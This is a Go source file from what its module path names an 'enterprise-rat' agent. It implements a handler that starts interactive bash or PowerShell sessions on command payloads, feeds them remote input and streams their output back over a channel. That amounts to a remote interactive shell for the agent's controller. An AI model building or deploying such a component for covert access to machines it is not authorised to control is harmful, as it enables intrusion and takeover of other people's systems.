package executor

import (
	"context"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"runtime"
	"sync"

	"github.com/enterprise-rat/agent/internal/models"
)

type PtyOutput struct {
	SessionID string
	Data      []byte
}

type PtyHandler struct {
	sessions    map[string]*PtySession
	mu          sync.RWMutex
	maxSessions int
	OutputChan  chan PtyOutput
}

type PtySession struct {
	ID     string
	Cmd    *exec.Cmd
	Stdin  io.WriteCloser
	Stdout io.Reader
	Cols   int
	Rows   int
	closed bool
	mu     sync.Mutex
	ctx    context.Context
	cancel context.CancelFunc
}

func NewPtyHandler() *PtyHandler {
	return &PtyHandler{
		sessions:    make(map[string]*PtySession),
		maxSessions: 10,
		OutputChan:  make(chan PtyOutput, 100),
	}
}

func (h *PtyHandler) HandlePtyCommand(payload map[string]interface{}) (*models.CommandResponse, bool) {
	ptyType, _ := payload["pty_type"].(string)
	sessionID, _ := payload["session_id"].(string)

	if sessionID == "" {
		return &models.CommandResponse{
			ExitCode: -1,
			ErrorMsg: "missing session_id",
		}, false
	}

	switch ptyType {
	case "start":
		return h.startSession(payload)
	case "resize":
		return h.resizeSession(payload), false // No direct response needed if streaming
	case "input":
		return h.handleInput(payload), false // No direct response needed if streaming
	case "stop":
		return h.stopSession(payload), false
	default:
		return &models.CommandResponse{
			ExitCode: -1,
			ErrorMsg: fmt.Sprintf("unknown pty_type: %s", ptyType),
		}, false
	}
}

func (h *PtyHandler) startSession(payload map[string]interface{}) (*models.CommandResponse, bool) {
	sessionID, _ := payload["session_id"].(string)
	cols := int(getFloat64(payload, "cols", 80))
	rows := int(getFloat64(payload, "rows", 24))
	shell, _ := payload["shell"].(string)

	h.mu.Lock()
	if len(h.sessions) >= h.maxSessions {
		h.mu.Unlock()
		return &models.CommandResponse{
			ExitCode: -1,
			ErrorMsg: "max sessions reached",
		}, false
	}

	if _, exists := h.sessions[sessionID]; exists {
		h.mu.Unlock()
		return &models.CommandResponse{
			ExitCode: -1,
			ErrorMsg: "session already exists",
		}, false
	}
	h.mu.Unlock()

	if shell == "" {
		if isWindows() {
			shell = "powershell.exe"
		} else {
			shell = "/bin/bash"
		}
	}

	session, err := h.createPtySession(sessionID, shell, cols, rows)
	if err != nil {
		return &models.CommandResponse{
			ExitCode: -1,
			ErrorMsg: fmt.Sprintf("failed to create PTY: %v", err),
		}, false
	}

	h.mu.Lock()
	h.sessions[sessionID] = session
	h.mu.Unlock()

	return &models.CommandResponse{
		CommandID: sessionID,
		ExitCode:  0,
	}, true
}

func (h *PtyHandler) createPtySession(sessionID, shell string, cols, rows int) (*PtySession, error) {
	session := &PtySession{
		ID:   sessionID,
		Cols: cols,
		Rows: rows,
	}

	session.ctx, session.cancel = context.WithCancel(context.Background())

	var err error
	if isWindows() {
		err = h.createWindowsSession(session, shell)
	} else {
		err = h.createUnixSession(session, shell)
	}

	if err != nil {
		return nil, err
	}

	go h.streamOutput(session)

	return session, nil
}

func (h *PtyHandler) createUnixSession(session *PtySession, shell string) error {
	cmd := exec.Command(shell, "-i")

	stdin, err := cmd.StdinPipe()
	if err != nil {
		return err
	}

	pr, pw := io.Pipe()
	cmd.Stdout = pw
	cmd.Stderr = pw

	session.Stdin = stdin
	session.Stdout = pr

	if err := cmd.Start(); err != nil {
		pr.Close()
		pw.Close()
		return err
	}

	go func() {
		cmd.Wait()
		pw.Close()
	}()

	session.Cmd = cmd
	return nil
}

func (h *PtyHandler) createWindowsSession(session *PtySession, shell string) error {
	cmd := exec.Command(shell)

	stdin, err := cmd.StdinPipe()
	if err != nil {
		return err
	}

	pr, pw := io.Pipe()
	cmd.Stdout = pw
	cmd.Stderr = pw

	session.Stdin = stdin
	session.Stdout = pr

	if err := cmd.Start(); err != nil {
		pr.Close()
		pw.Close()
		return err
	}

	go func() {
		cmd.Wait()
		pw.Close()
	}()

	session.Cmd = cmd
	return nil
}

func (h *PtyHandler) streamOutput(session *PtySession) {
	buf := make([]byte, 8192)
	for {
		n, err := session.Stdout.Read(buf)
		if n > 0 {
			select {
			case h.OutputChan <- PtyOutput{SessionID: session.ID, Data: append([]byte(nil), buf[:n]...)}:
			case <-session.ctx.Done():
				return
			}
		}
		if err != nil {
			if err != io.EOF {
				log.Printf("[PTY] Error reading from session %s: %v", session.ID, err)
			}
			return
		}
	}
}

func (h *PtyHandler) resizeSession(payload map[string]interface{}) *models.CommandResponse {
	sessionID, _ := payload["session_id"].(string)
	cols := int(getFloat64(payload, "cols", 80))
	rows := int(getFloat64(payload, "rows", 24))

	session := h.getSession(sessionID)
	if session == nil {
		return &models.CommandResponse{
			ExitCode: -1,
			ErrorMsg: "session not found",
		}
	}

	session.Cols = cols
	session.Rows = rows

	return nil
}

func (h *PtyHandler) handleInput(payload map[string]interface{}) *models.CommandResponse {
	sessionID, _ := payload["session_id"].(string)
	data, _ := payload["data"].(string)

	session := h.getSession(sessionID)
	if session == nil {
		return &models.CommandResponse{
			ExitCode: -1,
			ErrorMsg: "session not found",
		}
	}

	if data != "" && session.Stdin != nil {
		session.Stdin.Write([]byte(data))
	}

	return nil
}

func (h *PtyHandler) stopSession(payload map[string]interface{}) *models.CommandResponse {
	sessionID, _ := payload["session_id"].(string)

	session := h.getSession(sessionID)
	if session == nil {
		return nil
	}

	session.close()

	h.mu.Lock()
	delete(h.sessions, sessionID)
	h.mu.Unlock()

	return nil
}

func (h *PtyHandler) getSession(sessionID string) *PtySession {
	h.mu.RLock()
	defer h.mu.RUnlock()
	return h.sessions[sessionID]
}

func (s *PtySession) close() error {
	s.mu.Lock()
	defer s.mu.Unlock()

	if s.closed {
		return nil
	}
	s.closed = true

	if s.cancel != nil {
		s.cancel()
	}

	if s.Stdin != nil {
		s.Stdin.Close()
	}

	if s.Cmd != nil && s.Cmd.Process != nil {
		s.Cmd.Process.Kill()
		s.Cmd.Wait()
	}

	return nil
}

func isWindows() bool {
	return runtime.GOOS == "windows"
}

func getFloat64(m map[string]interface{}, key string, defaultVal float64) float64 {
	if v, ok := m[key].(float64); ok {
		return v
	}
	return defaultVal
}
